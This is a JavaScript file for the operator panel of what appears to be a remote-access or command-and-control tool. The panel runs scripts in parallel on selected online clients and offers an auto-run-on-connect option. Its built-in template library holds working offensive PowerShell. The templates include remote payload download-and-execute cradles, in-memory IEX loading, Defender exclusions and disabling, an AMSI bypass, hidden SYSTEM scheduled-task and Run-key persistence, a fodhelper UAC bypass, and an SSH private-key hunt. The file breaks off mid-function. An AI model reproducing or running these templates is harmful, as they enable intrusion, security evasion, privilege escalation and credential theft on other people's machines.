const clientList = document.getElementById("client-list");
const clientSearch = document.getElementById("client-search");
const osFilter = document.getElementById("os-filter");
const selectAllBtn = document.getElementById("select-all-btn");
const clearSelectionBtn = document.getElementById("clear-selection-btn");
const selectedCountSpan = document.getElementById("selected-count");
const scriptEditor = document.getElementById("script-editor");
const scriptType = document.getElementById("script-type");
const executeBtn = document.getElementById("execute-btn");
const outputContainer = document.getElementById("output-container");
const clearOutputBtn = document.getElementById("clear-output-btn");
const scriptSaveName = document.getElementById("script-save-name");
const saveScriptBtn = document.getElementById("save-script-btn");
const savedScriptsList = document.getElementById("saved-scripts-list");
let allClients = [];
let filteredClients = [];
const selectedClients = new Set();
const SAVED_SCRIPTS_KEY = "nubyone_saved_scripts";
let editorInstance = null;

const EDITOR_MODES = {
  powershell: "powershell",
  bash: "shell",
  cmd: "shell",
  python: "python",
  sh: "shell",
};

function getEditorValue() {
  if (editorInstance) return editorInstance.getValue();
  return scriptEditor?.value || "";
}

function setEditorValue(value) {
  if (editorInstance) {
    editorInstance.setValue(value);
    return;
  }
  if (scriptEditor) scriptEditor.value = value;
}

function setEditorMode(type) {
  if (!editorInstance) return;
  const mode = EDITOR_MODES[type] || "powershell";
  editorInstance.setOption("mode", mode);
}

async function loadClients() {
  try {
    const res = await fetch("/api/clients?pageSize=10000");
    if (!res.ok) throw new Error("Failed to load clients");

    const data = await res.json();
    allClients = data.items.filter((c) => c.online);

    if (allClients.length === 0) {
      clientList.innerHTML = '<div class="empty-state">No online clients available</div>';
      return;
    }

    const osList = new Set(allClients.map(c => c.os || "unknown"));
    osFilter.innerHTML = '<option value="all">All OS (' + allClients.length + ')</option>' +
      Array.from(osList).sort().map(os => {
        const count = allClients.filter(c => (c.os || "unknown") === os).length;
        return `<option value="${escapeHtml(os)}">${escapeHtml(os)} (${count})</option>`;
      }).join("");

    filterAndRenderClients();
  } catch (error) {
    console.error("Failed to load clients:", error);
    clientList.innerHTML = '<div class="empty-state" style="color:#f87171;">Error loading clients</div>';
  }
}

function filterAndRenderClients() {
  const searchTerm = clientSearch.value.toLowerCase();
  const osValue = osFilter.value;

  filteredClients = allClients.filter(c => {
    const matchesSearch = !searchTerm ||
      (c.host && c.host.toLowerCase().includes(searchTerm)) ||
      c.id.toLowerCase().includes(searchTerm) ||
      (c.os && c.os.toLowerCase().includes(searchTerm)) ||
      (c.user && c.user.toLowerCase().includes(searchTerm));

    const matchesOs = osValue === "all" || (c.os || "unknown") === osValue;

    return matchesSearch && matchesOs;
  });

  renderClients();
}

function renderClients() {
  if (filteredClients.length === 0) {
    clientList.innerHTML = '<div class="empty-state">No clients match your filters</div>';
    return;
  }

  clientList.innerHTML = filteredClients.map(c => {
    const name = c.host || c.id.substring(0, 8);
    const os = c.os || "unknown";
    const isSelected = selectedClients.has(c.id);

    return `
      <div class="client-row" data-client-id="${escapeHtml(c.id)}">
        <input type="checkbox" class="client-checkbox" data-id="${escapeHtml(c.id)}" ${isSelected ? 'checked' : ''}>
        <div class="client-info">
          <div class="client-name">${escapeHtml(name)}</div>
          <div class="client-meta">
            ${escapeHtml(os)}${c.user ? ` &bull; ${escapeHtml(c.user)}` : ''} &bull; ${c.id.substring(0, 8)}
          </div>
        </div>
        <span class="online-dot"><i class="fa-solid fa-circle"></i> Online</span>
      </div>
    `;
  }).join("");

  clientList.querySelectorAll('.client-checkbox').forEach(cb => {
    cb.addEventListener('change', handleClientToggle);
  });

  clientList.querySelectorAll('.client-row').forEach(row => {
    row.addEventListener('click', (e) => {
      if (e.target.type === 'checkbox') return;
      const cb = row.querySelector('.client-checkbox');
      if (cb) {
        cb.checked = !cb.checked;
        handleClientToggle({ target: cb });
      }
    });
  });

  updateSelectedCount();
}

function handleClientToggle(e) {
  const clientId = e.target.dataset.id;
  if (e.target.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateSelectedCount();
}

function updateSelectedCount() {
  selectedCountSpan.textContent = `${selectedClients.size} selected`;
  executeBtn.disabled = selectedClients.size === 0;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function getSavedScripts() {
  try {
    const items = JSON.parse(localStorage.getItem(SAVED_SCRIPTS_KEY) || "[]");
    return Array.isArray(items) ? items : [];
  } catch (err) {
    console.error("Failed to load saved scripts:", err);
    return [];
  }
}

function setSavedScripts(scripts) {
  try {
    const trimmed = scripts.slice(0, 50);
    localStorage.setItem(SAVED_SCRIPTS_KEY, JSON.stringify(trimmed));
  } catch (err) {
    console.error("Failed to save scripts:", err);
  }
}

function renderSavedScripts() {
  const scripts = getSavedScripts().sort((a, b) => b.updatedAt - a.updatedAt);

  if (scripts.length === 0) {
    savedScriptsList.innerHTML = '<div class="empty-state" style="padding:.7rem;">No saved scripts yet.</div>';
    return;
  }

  savedScriptsList.innerHTML = scripts.map((s) => {
    return `
      <div class="item-row">
        <div class="min-w-0" style="flex:1;min-width:0;">
          <div class="item-name">${escapeHtml(s.name)}</div>
          <div class="item-meta">${escapeHtml(s.type)} &bull; ${new Date(s.updatedAt).toLocaleString()}</div>
        </div>
        <div class="item-actions">
          <button class="btn btn-accent btn-sm load-saved-script" data-id="${escapeHtml(s.id)}">Load</button>
          <button class="btn btn-danger btn-sm delete-saved-script" data-id="${escapeHtml(s.id)}">Delete</button>
        </div>
      </div>
    `;
  }).join("");

  savedScriptsList.querySelectorAll(".load-saved-script").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = btn.dataset.id;
      const scripts = getSavedScripts();
      const script = scripts.find((s) => s.id === id);
      if (!script) return;
      setEditorValue(script.content);
      scriptType.value = script.type;
      scriptSaveName.value = script.name;
      setEditorMode(script.type);
      showToast("Script loaded", "success", 3000);
    });
  });

  savedScriptsList.querySelectorAll(".delete-saved-script").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = btn.dataset.id;
      const scripts = getSavedScripts().filter((s) => s.id !== id);
      setSavedScripts(scripts);
      renderSavedScripts();
      showToast("Saved script deleted", "info", 3000);
    });
  });
}

function saveCurrentScript() {
  const name = scriptSaveName.value.trim();
  const content = getEditorValue().trim();
  const type = scriptType.value;

  if (!name) {
    showToast("Please provide a name for the script", "warning", 3000);
    return;
  }

  if (!content) {
    showToast("Script is empty", "warning", 3000);
    return;
  }

  const scripts = getSavedScripts();
  const existing = scripts.find((s) => s.name.toLowerCase() === name.toLowerCase());

  if (existing) {
    const ok = confirm("A script with this name already exists. Overwrite it?");
    if (!ok) return;
    existing.content = content;
    existing.type = type;
    existing.updatedAt = Date.now();
  } else {
    scripts.push({
      id: `script-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      name,
      content,
      type,
      createdAt: Date.now(),
      updatedAt: Date.now(),
    });
  }

  setSavedScripts(scripts);
  renderSavedScripts();
  showToast("Script saved", "success", 3000);
}

clientSearch.addEventListener("input", filterAndRenderClients);
osFilter.addEventListener("change", filterAndRenderClients);

selectAllBtn.addEventListener("click", () => {
  filteredClients.forEach(c => selectedClients.add(c.id));
  renderClients();
});

clearSelectionBtn.addEventListener("click", () => {
  selectedClients.clear();
  renderClients();
});

executeBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  const script = getEditorValue().trim();
  if (!script) {
    alert("Please enter a script to execute");
    return;
  }

  const timeoutInput = document.getElementById("exec-timeout");
  const timeoutSecs = Math.min(600, Math.max(5, parseInt(timeoutInput?.value || "60", 10) || 60));

  executeBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<span class="out-dim">Executing script on ${clientIds.length} client(s) (timeout: ${timeoutSecs}s)…</span>`;

  // Run all clients in parallel — much faster than serial await for multi-target
  const results = await Promise.all(clientIds.map(async (clientId) => {
    const client = allClients.find(c => c.id === clientId);
    const clientName = client ? (client.host || clientId.substring(0, 8)) : clientId.substring(0, 8);
    // Give the fetch a 5 s grace buffer beyond the server's own timeout
    const aborter = new AbortController();
    const abortTimer = setTimeout(() => aborter.abort(), (timeoutSecs + 10) * 1000);
    try {
      const res = await fetch(`/api/clients/${clientId}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        signal: aborter.signal,
        body: JSON.stringify({
          action: "script_exec",
          script: script,
          scriptType: scriptType.value,
          timeoutSecs,
        }),
      });
      clearTimeout(abortTimer);
      if (!res.ok) return { clientName, clientId, error: `HTTP ${res.status}` };
      const data = await res.json();
      if (!data.ok) return { clientName, clientId, error: data.error || "Unknown error" };
      return {
        clientName,
        clientId,
        output: data.result || "(no output)",
        stderr: data.error || "",
        exitCode: typeof data.exitCode === "number" ? data.exitCode : 0,
      };
    } catch (error) {
      clearTimeout(abortTimer);
      return { clientName, clientId, error: error.name === "AbortError" ? `Timed out after ${timeoutSecs}s` : error.message };
    }
  }));

  outputContainer.innerHTML = results.map(r => {
    if (r.error) {
      return `<div>
        <div class="out-header">&#9472;&#9472;&#9472; ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) &#9472;&#9472;&#9472;</div>
        <div class="out-error">Error: ${escapeHtml(r.error)}</div>
        <hr class="out-divider">
      </div>`;
    }
    const exitLine = (r.exitCode && r.exitCode !== 0)
      ? `<div class="out-error">Exit code: ${escapeHtml(String(r.exitCode))}</div>`
      : "";
    const stderrLine = r.stderr
      ? `<div class="out-error">stderr: ${escapeHtml(r.stderr)}</div>`
      : "";
    return `<div>
      <div class="out-header">&#9472;&#9472;&#9472; ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) &#9472;&#9472;&#9472;</div>
      <div>${escapeHtml(r.output)}</div>
      ${stderrLine}
      ${exitLine}
      <hr class="out-divider">
    </div>`;
  }).join("");

  executeBtn.disabled = false;
  updateSelectedCount();
});

clearOutputBtn.addEventListener("click", () => {
  outputContainer.innerHTML = '<span class="out-dim">No output yet. Execute a script to see results.</span>';
});

saveScriptBtn?.addEventListener("click", saveCurrentScript);
scriptSaveName?.addEventListener("keypress", (e) => {
  if (e.key === "Enter") {
    saveCurrentScript();
  }
});

scriptType?.addEventListener("change", () => {
  setEditorMode(scriptType.value);
});

const TEMPLATE_CATEGORIES = [
  {
    label: "Remote Install",
    icon: "fa-solid fa-rocket",
    templates: [
      {
        label: "Install EXE from URL",
        desc: "Download and run an .exe silently — no dev tools needed",
        type: "powershell",
        script: `# Replace URL and silent flag for your installer
# Common silent flags: /S (NSIS), /silent (InnoSetup), /quiet (others)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/setup.exe'
$tmp = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName() + '.exe')
(New-Object Net.WebClient).DownloadFile($url, $tmp)
try { [IO.File]::Delete($tmp + ':Zone.Identifier') } catch {}
Start-Process $tmp -ArgumentList '/S' -WindowStyle Hidden -Wait
try { Remove-Item $tmp -Force -EA Ignore } catch {}
Write-Host 'Install complete.'`
      },
      {
        label: "Install MSI from URL",
        desc: "Download and silently install an MSI package",
        type: "powershell",
        script: `# Replace the URL below with your MSI link
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/package.msi'
$tmp = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName() + '.msi')
(New-Object Net.WebClient).DownloadFile($url, $tmp)
try { [IO.File]::Delete($tmp + ':Zone.Identifier') } catch {}
$proc = Start-Process msiexec.exe -ArgumentList "/i \`"$tmp\`" /qn /norestart" -WindowStyle Hidden -PassThru -Wait
try { Remove-Item $tmp -Force -EA Ignore } catch {}
Write-Host "Exit code: $($proc.ExitCode)"`
      },
      {
        label: "Run BAT/CMD from URL",
        desc: "Download and execute a batch script via CMD",
        type: "powershell",
        script: `# Replace the URL below with your .bat/.cmd link
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/deploy.bat'
$tmp = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName() + '.bat')
(New-Object Net.WebClient).DownloadFile($url, $tmp)
try { [IO.File]::Delete($tmp + ':Zone.Identifier') } catch {}
Start-Process cmd.exe -ArgumentList "/c \`"$tmp\`"" -WindowStyle Hidden -Wait
try { Remove-Item $tmp -Force -EA Ignore } catch {}
Write-Host 'Done.'`
      },
      {
        label: "Create LNK Shortcut",
        desc: "Place a shortcut in Startup or Desktop (persists across reboots)",
        type: "powershell",
        script: `# Creates a Startup shortcut pointing to any EXE
$target = 'C:\\Path\\To\\Your\\App.exe'
$lnkPath = [IO.Path]::Combine([Environment]::GetFolderPath('Startup'), 'MyApp.lnk')
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = $target
$lnk.WindowStyle = 7   # 7 = minimised
$lnk.Save()
Write-Output "Shortcut created: $lnkPath"`
      },
      {
        label: "Run Base64 PS in Memory",
        desc: "Decode and execute a base64-encoded PowerShell payload in memory",
        type: "powershell",
        script: `# Paste your UTF-16LE base64-encoded PowerShell script below.
# To encode: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('your command'))
$b64 = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAgAGYAcgBvAG0AIABiAGEAcwBlADYANAAiAA=='
$bytes   = [Convert]::FromBase64String($b64)
$decoded = [Text.Encoding]::Unicode.GetString($bytes)
Invoke-Expression $decoded`
      },
      {
        label: "IEX Cradle (PS1 from URL)",
        desc: "Download and execute a PowerShell script entirely in memory",
        type: "powershell",
        script: `# Replace with your PS1 URL — script runs in memory, nothing written to disk
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/payload.ps1'
$c = New-Object Net.WebClient
$c.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
Invoke-Expression ($c.DownloadString($url))`
      },
      {
        label: "Deploy & Run via CMD (no PS)",
        desc: "Pure CMD: curl download + run — works even if PowerShell is disabled",
        type: "cmd",
        script: `@echo off
set "url=https://example.com/setup.exe"
set "tmp=%TEMP%\\deploy_%RANDOM%.exe"
curl -sSL -o "%tmp%" "%url%"
start "" /B "%tmp%"
timeout /t 2 /nobreak >nul
del /F /Q "%tmp%" 2>nul`
      },
      {
        label: "Check & Kill Process",
        desc: "Check if a process is running then kill it by name",
        type: "powershell",
        script: `$name = 'notepad'   # change to your process name
$procs = Get-Process -Name $name -ErrorAction SilentlyContinue
if ($procs) {
  $procs | Stop-Process -Force
  Write-Output "Killed $($procs.Count) instance(s) of $name"
} else {
  Write-Output "Process '$name' is not running"
}`
      },
    ],
  },
  {
    label: "Stealth Deploy",
    icon: "fa-solid fa-user-ninja",
    templates: [
      {
        label: "Defender Excl + Download + Run",
        desc: "Add %TEMP% exclusion, download EXE silently, execute, clean up",
        type: "powershell",
        script: `# Requires admin/SYSTEM for the exclusion step; download+run still works without it
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/download.exe'
$out = "$env:TEMP\\setup_zc.exe"

# Add TEMP to Defender scan exclusions (requires admin; silently ignored if not)
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue

$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$wc.DownloadFile($url, $out)
try { [IO.File]::Delete($out + ':Zone.Identifier') } catch {}

Start-Process -FilePath $out -ArgumentList '/S' -WindowStyle Hidden -Wait

Remove-Item $out -Force -ErrorAction SilentlyContinue
Write-Host 'Done.'`
      },
      {
        label: "Disable Defender Real-Time",
        desc: "Turn off Defender real-time monitoring (requires admin/SYSTEM)",
        type: "powershell",
        script: `# Requires local admin or SYSTEM privilege
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection    $true -ErrorAction SilentlyContinue
try {
  $s = Get-MpComputerStatus -ErrorAction Stop
  Write-Host "RealTimeProtection: $($s.RealTimeProtectionEnabled)"
  Write-Host "AntivirusEnabled:   $($s.AntivirusEnabled)"
} catch {
  Write-Host 'Defender status unavailable (service may be fully stopped or not installed)'
}`
      },
      {
        label: "Exclusion + IEX in Memory",
        desc: "Exclude TEMP, then run a remote PS1 entirely in memory (no disk write)",
        type: "powershell",
        script: `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/payload.ps1'
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
$c = New-Object Net.WebClient
$c.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
Invoke-Expression ($c.DownloadString($url))`
      },
      {
        label: "AMSI Patch + IEX",
        desc: "Patch AMSI scan buffer in-process, then IEX a remote script (memory-only)",
        type: "powershell",
        script: `# In-process AMSI bypass — blinds only this PS session's AMSI hook
# Does NOT disable Defender. Ineffective on patched/hardened systems.
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if (-not $a) { Write-Warning 'AmsiUtils not found — PS version may not support this bypass'; return }
$b = $a.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
if (-not $b) { Write-Warning 'amsiInitFailed field not found — may be patched'; return }
$b.SetValue($null, $true)
Write-Host 'AMSI bypassed for this session.'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://example.com/payload.ps1'
$c = New-Object Net.WebClient
Invoke-Expression ($c.DownloadString($url))`
      },
      {
        label: "Hollow schtasks Persist",
        desc: "Register a hidden scheduled task that runs your EXE as SYSTEM at boot + logon",
        type: "powershell",
        script: `# Registers a SYSTEM-level scheduled task (requires admin/SYSTEM)
$exePath = 'C:\\ProgramData\\Nubyone\\zc-agent.exe'   # change to your path
$taskName = 'NubyoneAgent'

$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure>
  </Settings>
  <Actions>
    <Exec><Command>$exePath</Command></Exec>
  </Actions>
</Task>
"@

$tmpXml = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName() + '.xml')
[IO.File]::WriteAllText($tmpXml, $xml, [Text.Encoding]::Unicode)
$out = schtasks /Create /TN $taskName /XML $tmpXml /F 2>&1
Remove-Item $tmpXml -Force -EA Ignore
if ($LASTEXITCODE -ne 0) { Write-Error "schtasks create failed (exit $LASTEXITCODE): $out"; exit 1 }
$out2 = schtasks /Run /TN $taskName 2>&1
if ($LASTEXITCODE -ne 0) { Write-Error "schtasks run failed (exit $LASTEXITCODE): $out2"; exit 1 }
Write-Host "Task registered and started: $taskName"`
      },
      {
        label: "MOTW Strip All in Folder",
        desc: "Remove Zone.Identifier from every file in a folder (kills SmartScreen for them)",
        type: "powershell",
        script: `$folder = $env:TEMP   # change to your folder
Get-ChildItem -Path $folder -File -Recurse | ForEach-Object {
  $ads = $_.FullName + ':Zone.Identifier'
  try { [IO.File]::Delete($ads) } catch {}
}
Write-Host "MOTW stripped from all files in $folder"`
      },
      {
        label: "Registry Run Key Persist",
        desc: "Write a HKCU Run key for per-user auto-start (no admin required)",
        type: "powershell",
        script: `$exePath = "$env:LOCALAPPDATA\\Nubyone\\zc-agent.exe"   # change path
$keyName = 'NubyoneAgent'
Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' \`
  -Name $keyName -Value $exePath -Type String
Write-Host "Run key written: $keyName -> $exePath"`,
      },
      {
        label: "UAC-Bypass fodhelper",
        desc: "Elevate to admin via fodhelper.exe registry hijack (no UAC dialog, Win10/11)",
        type: "powershell",
        script: `# fodhelper UAC bypass — works on default UAC setting (NotifyChanges), Win10/11
# Replace $elevatedCmd with the command you want to run as admin
# NOTE: calc.exe is a UWP app on Win10/11 — use cmd.exe or another real EXE
$elevatedCmd = 'cmd.exe /c "whoami > C:\\Windows\\Temp\\uac_test.txt"'

New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force | Out-Null
Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' \`
  -Name '(default)' -Value $elevatedCmd -Force
New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' \`
  -Name 'DelegateExecute' -Value '' -Force | Out-Null
Start-Process fodhelper.exe
Start-Sleep -Milliseconds 2500
# Clean up the hijack key
Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -EA Ignore
Write-Host 'Elevated command launched. Check C:\\Windows\\Temp\\uac_test.txt for whoami output.'`,
      },
    ],
  },
  {
    label: "Windows",
    icon: "fa-brands fa-windows",
    templates: [
      { label: "System Info", desc: "Get computer information (fast)", type: "powershell", script: "$os = Get-CimInstance Win32_OperatingSystem; $cs = Get-CimInstance Win32_ComputerSystem; $cpu = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name; [PSCustomObject]@{ Computer=$cs.Name; OS=$os.Caption; Version=$os.Version; Architecture=$os.OSArchitecture; CPU=$cpu; RAM_GB=[Math]::Round($cs.TotalPhysicalMemory/1GB,1) } | Format-List" },
      { label: "Top Processes", desc: "Show top 10 processes by CPU time", type: "powershell", script: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 @{n='Name';e={$_.Name}}, @{n='CPU(s)';e={[Math]::Round($_.CPU,1)}}, @{n='Mem(MB)';e={[Math]::Round($_.WorkingSet/1MB,1)}}" },
      { label: "Network Info", desc: "List network adapters and IPs", type: "powershell", script: "Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'} | Select-Object IPAddress, InterfaceAlias" },
      { label: "AV Status Check", desc: "Query registered antivirus products", type: "powershell", script: "$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue; if ($av) { $av | Select-Object displayName, pathToSignedProductExe, timestamp } else { Write-Output 'No AV product data returned from SecurityCenter2' }" },
      { label: "Defender Health", desc: "Show Microsoft Defender status", type: "powershell", script: "Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated" },
      { label: "Running Services", desc: "List active Windows services", type: "powershell", script: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName | Select-Object -First 30 Name, DisplayName, Status" },
    ],
  },
  {
    label: "Linux",
    icon: "fa-brands fa-linux",
    templates: [
      { label: "Disk Usage", desc: "Show mounted filesystem usage", type: "bash", script: "df -h" },
      { label: "System Status", desc: "Show system status (Linux)", type: "bash", script: "top -bn1 | head -20" },
      { label: "OS + Kernel Info", desc: "Show distro and kernel details", type: "bash", script: "uname -a; echo; lsb_release -a 2>/dev/null || cat /etc/os-release" },
      { label: "Top Processes", desc: "Show top CPU-consuming processes", type: "bash", script: "ps aux --sort=-%cpu | head -15" },
      { label: "Network Interfaces", desc: "List interfaces and assigned IPs", type: "bash", script: "ip addr 2>/dev/null || ifconfig" },
      { label: "Failed Services", desc: "Show failing services if available", type: "bash", script: "systemctl --failed 2>/dev/null || service --status-all 2>/dev/null" },
    ],
  },
  {
    label: "macOS",
    icon: "fa-brands fa-apple",
    templates: [
      { label: "System Info", desc: "Show macOS version and software details", type: "bash", script: "sw_vers; echo; system_profiler SPSoftwareDataType 2>/dev/null | head -40" },
      { label: "Top Processes", desc: "Show top CPU-consuming processes", type: "bash", script: "ps aux | sort -k3 -rn | head -15" },
      { label: "Network Interfaces", desc: "List interfaces and assigned IPs", type: "bash", script: "ifconfig 2>/dev/null || ip addr" },
      { label: "Sudo Rules", desc: "Show sudo permissions for the current user", type: "bash", script: "sudo -l 2>/dev/null || echo 'No sudo access or sudo not available'" },
      { label: "SSH Keys Hunt", desc: "Locate SSH private keys and authorized_keys files", type: "bash", script: "find $HOME /Users -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'authorized_keys' \\) 2>/dev/null" },
    ],
  },
];

function renderTemplatePalette() {
  const palette = document.getElementById("template-palette");
  const searchInput = document.getElementById("template-search");
  if (!palette) return;

  function render(term) {
    palette.innerHTML = "";
    for (const cat of TEMPLATE_CATEGORIES) {
      const filtered = term
        ? cat.templates.filter(
            (t) =>
              t.label.toLowerCase().includes(term) ||
              t.desc.toLowerCase().includes(term),
          )
        : cat.templates;
      if (term && filtered.length === 0) continue;

      const section = document.createElement("div");
      section.className = "tpl-category";

      const header = document.createElement("div");
      // All categories start expanded; search always keeps them expanded too
      header.className = "tpl-category-label";
      header.innerHTML = `<i class="fa-solid fa-chevron-down tpl-chevron"></i><i class="${escapeHtml(cat.icon)}"></i> ${escapeHtml(cat.label)} <span style="margin-left:auto;opacity:.6;font-size:.7rem;">${filtered.length}</span>`;
      header.addEventListener("click", () => {
        const isCollapsed = list.style.display === "none";
        list.style.display = isCollapsed ? "" : "none";
        header.querySelector(".tpl-chevron").style.transform = isCollapsed ? "" : "rotate(-90deg)";
      });
      section.appendChild(header);

      const list = document.createElement("div");
      list.className = "tpl-items";
      list.style.display = "";

      for (const tmpl of filtered) {
        const item = document.createElement("div");
        item.className = "tpl-item";
        item.innerHTML = `<div class="tpl-item-name">${escapeHtml(tmpl.label)}</div><div class="tpl-item-desc">${escapeHtml(tmpl.desc)}</div>`;
        item.addEventListener("click", () => {
          setEditorValue(tmpl.script);
          scriptType.value = tmpl.type;
          setEditorMode(tmpl.type);
        });
        list.appendChild(item);
      }

      section.appendChild(list);
      palette.appendChild(section);
    }
  }

  render("");

  if (searchInput) {
    searchInput.addEventListener("input", () => {
      const term = searchInput.value.toLowerCase().trim();
      render(term);
    });
  }
}

loadClients();
renderSavedScripts();
renderTemplatePalette();

if (window.CodeMirror && scriptEditor) {
  editorInstance = window.CodeMirror.fromTextArea(scriptEditor, {
    lineNumbers: true,
    mode: EDITOR_MODES[scriptType?.value || "powershell"] || "powershell",
    theme: "material-darker",
    indentUnit: 2,
    tabSize: 2,
    lineWrapping: true,
  });
  editorInstance.setSize(null, "100%");
  window._vbCodeMirror = editorInstance;
}

function showToast(message, type, duration) {
  let toastContainer = document.getElementById("toast-container");
  if (!toastContainer) {
    toastContainer = document.createElement("div");
    toastContainer.id = "toast-container";
    toastContainer.style.cssText = "position:fixed;bottom:1.5rem;right:1.5rem;z-index:9999;display:flex;flex-direction:column;gap:.5rem;";
    document.body.appendChild(toastContainer);
  }

  const colors = {
    success: { bg: "rgba(13,148,136,.9)", border: "rgba(0,210,200,.4)" },
    error: { bg: "rgba(239,68,68,.9)", border: "rgba(239,68,68,.4)" },
    warning: { bg: "rgba(245,158,11,.9)", border: "rgba(245,158,11,.4)" },
    info: { bg: "rgba(59,130,246,.9)", border: "rgba(59,130,246,.4)" },
  };
  const c = colors[type] || colors.info;

  const toast = document.createElement("div");
  toast.style.cssText = `background:${c.bg};border:1px solid ${c.border};color:#fff;padding:.6rem 1rem;border-radius:9px;font-size:.85rem;font-weight:500;font-family:inherit;backdrop-filter:blur(8px);box-shadow:0 4px 12px rgba(0,0,0,.3);max-width:300px;word-break:break-word;`;
  toast.textContent = message;
  toastContainer.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = "0";
    toast.style.transition = "opacity .3s";
    setTimeout(() => toast.remove(), 350);
  }, duration || 3000);
}

// ── Auto-run Scripts ──────────────────────────────────────────────────────

const autorunSetBtn = document.getElementById("autorun-set-btn");
const autorunPanel = document.getElementById("autorun-panel");
const autorunNameInput = document.getElementById("autorun-name");
const autorunTriggerSelect = document.getElementById("autorun-trigger");
const autorunSaveBtn = document.getElementById("autorun-save-btn");
const autorunCancelBtn = document.getElementById("autorun-cancel-btn");
const autorunList = document.getElementById("autorun-list");

autorunSetBtn?.addEventListener("click", () => {
  if (!autorunPanel) return;
  const isOpen = autorunPanel.style.display !== "none";
  autorunPanel.style.display = isOpen ? "none" : "";
  if (!isOpen) {
    const name = scriptSaveName?.value?.trim() || "";
    if (name && autorunNameInput) autorunNameInput.value = name;
    autorunNameInput?.focus();
  }
});

autorunCancelBtn?.addEventListener("click", () => {
  if (autorunPanel) autorunPanel.style.display = "none";
});

autorunSaveBtn?.addEventListener("click", async () => {
  const name = (autorunNameInput?.value || "").trim();
  const content = getEditorValue().trim();
  const type = scriptType?.value || "powershell";
  const trigger = autorunTriggerSelect?.value || "on_connect";
  if (!name) { showToast("Enter a name for this auto-run script", "warning", 3000); return; }
  if (!content) { showToast("Script is empty", "warning", 3000); return; }
  try {
    const res = await fetch("/api/scripts/autorun", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, content, type, trigger }),
    });
    if (!res.ok) throw new Error("Failed");
    if (autorunPanel) autorunPanel.style.display = "none";
    showToast("Auto-run script saved", "success", 3000);
    renderAutorunScripts();
  } catch { showToast("Failed to save auto-run script", "error", 3000); }
});

async function renderAutorunScripts() {
  if (!autorunList) return;
  try {
